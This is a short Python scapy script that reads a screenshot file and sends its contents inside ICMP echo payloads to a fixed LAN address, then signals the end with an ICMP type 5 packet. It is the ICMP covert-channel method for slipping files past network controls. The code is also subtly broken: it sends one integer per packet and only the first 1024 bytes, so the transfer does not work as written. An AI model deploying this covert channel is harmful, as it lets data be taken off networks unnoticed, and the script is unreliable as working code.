#!/usr/bin/env python3
from scapy.all import *

if __name__ == "__main__":
  # to check network interface name and id use commend:
  # IFACES.show()
  # help(IFACES)
  dst_ip = "192.168.1.3"
  f = open("./screen1.png", "rb")
  interface = IFACES.dev_from_index(3)

  for line in f.read(1024):
    send(IP(dst=dst_ip)/ICMP()/Raw(load=line),iface=interface)

  # Send EOF message
  send(IP(dst=dst_ip)/ICMP(type=5),iface=interface)
  print("Done")
